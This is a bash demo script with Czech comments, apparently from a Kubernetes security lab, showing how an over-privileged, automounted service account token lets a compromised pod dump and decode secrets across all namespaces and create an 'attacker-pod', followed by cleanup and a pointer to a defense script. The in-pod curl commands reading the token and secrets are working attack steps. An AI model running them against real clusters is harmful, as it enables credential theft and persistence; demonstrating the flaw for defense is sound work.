#!/usr/bin/env bash
# 01 — AC5: příliš široké RBAC. Z podu vulnapp přes automountovaný token SA
# (navázaný na cluster-admin) vylistujeme secrets napříč namespaces a vytvoříme
# další pod — vše přímo proti API serveru. Obrana je v 05-rbac-defense.sh.
set -euo pipefail
source "$(dirname "$0")/lib.sh"
source "$(dirname "$0")/env.sh" 2>/dev/null || true
NS_INSECURE="${NS_INSECURE:-insecure-demo}"
require_kubectl
# Fallback, kdyz na nodu neni samostatna binarka kubectl (jen "k3s kubectl"):
if ! command -v kubectl >/dev/null 2>&1; then kubectl() { k3s kubectl "$@"; }; fi
MANIFESTS="$(cd "$(dirname "$0")/../manifests" && pwd)"

bad "Scénář (AC5): aplikační ServiceAccount 'app-sa' je navázaný na cluster-admin"
bad "a jeho token je automountovaný do podu. Kdo se dostane do kontejneru, ovládne cluster."
say "Nasadíme nezabezpečený workload (image :latest, privileged, root, hostPath /)."
pause

echo
say "1) Nasazení insecure manifestů (RBAC → secret → workload):"
kube_apply "$MANIFESTS/insecure/02-rbac-overprivileged.yaml"
kube_apply "$MANIFESTS/insecure/03-secret-plaintext.yaml"
kube_apply "$MANIFESTS/insecure/01-workload.yaml"
wait_pod "$NS_INSECURE" app=vulnapp || true
POD="$(kubectl -n "$NS_INSECURE" get pod -l app=vulnapp -o jsonpath='{.items[0].metadata.name}')"
say "Běžící pod: $POD"
pause

echo
say "2) Z POD-u (jen s jeho vlastním automountovaným tokenem) voláme API server."
say "   Útočník žádné heslo nezná — stačí mu, že je uvnitř kontejneru."
echo
say "2a) Vylistujeme SECRETS napříč VŠEMI namespaces (včetně kube-system):"
kubectl -n "$NS_INSECURE" exec "$POD" -- sh -c '
  apk add --no-cache curl jq >/dev/null 2>&1 || true
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  API=https://kubernetes.default.svc
  echo "   Nalezené secrets (namespace/jméno):"
  if command -v jq >/dev/null 2>&1; then
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$API/api/v1/secrets" \
      | jq -r ".items[] | \"     \(.metadata.namespace)/\(.metadata.name)\""
  else
    # fallback bez jq: vytáhne name+namespace z metadata bloků
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$API/api/v1/secrets" \
      | tr "," "\n" | grep -E "\"(name|namespace)\":" | sed "s/.*: *//; s/\"//g"
  fi
  echo
  echo "   >>> A rovnou DEŠIFRUJEME konkrétní secret (insecure-demo/app-secrets):"
  if command -v jq >/dev/null 2>&1; then
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
      "$API/api/v1/namespaces/insecure-demo/secrets/app-secrets" \
      | jq -r ".data | to_entries[] | \"     \(.key) = \(.value | @base64d)\""
  else
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
      "$API/api/v1/namespaces/insecure-demo/secrets/app-secrets" \
      | tr "," "\n" | grep -E "DB_PASSWORD|API_KEY" \
      | sed "s/.*\"\([A-Z_]*\)\": *\"\([^\"]*\)\".*/     \1 = \2 (base64)/"
  fi
'
bad "Pod bez jakéhokoli hesla přečetl a DEŠIFROVAL secrets celého clusteru → kompletní únik."
pause

echo
say "2b) Vytvoříme NOVÝ pod přes API (důkaz práva pods/create v celém clusteru):"
kubectl -n "$NS_INSECURE" exec "$POD" -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
  API=https://kubernetes.default.svc
  curl -s -o /dev/null -w "   HTTP %{http_code} (201 = pod vytvořen)\n" \
    -X POST --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "$API/api/v1/namespaces/$NS/pods" \
    -d "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"attacker-pod\"},\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"alpine:latest\",\"command\":[\"sleep\",\"3600\"]}]}}"
'
sleep 2
run kubectl -n "$NS_INSECURE" get pod attacker-pod -o wide 2>/dev/null || warn "attacker-pod se nezobrazil (možná ještě plánuje)"
bad "Útočník si v clusteru vytvořil vlastní pod → trvalá opora pro další útok."
pause

echo
warn "Úklid útočníkova podu:"
kubectl -n "$NS_INSECURE" delete pod attacker-pod --ignore-not-found >/dev/null 2>&1 || true
echo
good "Obrana (AC11, viz 05-rbac-defense.sh): dedikovaný SA s minimální Role,"
good "automountServiceAccountToken: false. Pak 'kubectl auth can-i get secrets' = no."
